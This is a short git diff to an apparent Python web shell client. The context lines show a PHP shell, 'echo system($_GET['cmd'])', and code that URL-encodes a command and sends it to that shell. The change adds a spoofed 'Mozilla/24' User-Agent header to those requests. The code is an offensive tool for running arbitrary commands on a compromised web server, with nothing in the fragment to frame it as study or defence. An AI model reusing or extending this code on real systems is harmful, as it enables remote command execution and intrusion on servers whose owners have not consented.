@@ -3,6 +3,8 @@ import urllib.request
 from optparse import OptionParser
 import urllib.parse
 import signal
+from  urllib.request import Request
+
 
 banner= """
 
@@ -91,7 +93,8 @@ echo system($_GET['cmd']);
             param={"cmd":cmd}
             cmden=urllib.parse.urlencode(param)
             #print(url+"?"+cmden)
-            openurl=urllib.request.urlopen(url+"?"+cmden)
+            URL=Request(url+"?"+cmden,headers={'User-Agent':'Mozilla/24'})
+            openurl=urllib.request.urlopen(URL)
             reponse=str(openurl.read())
             #soup=BeautifulSoup(reponse,"html.parser")
             #for i in soup
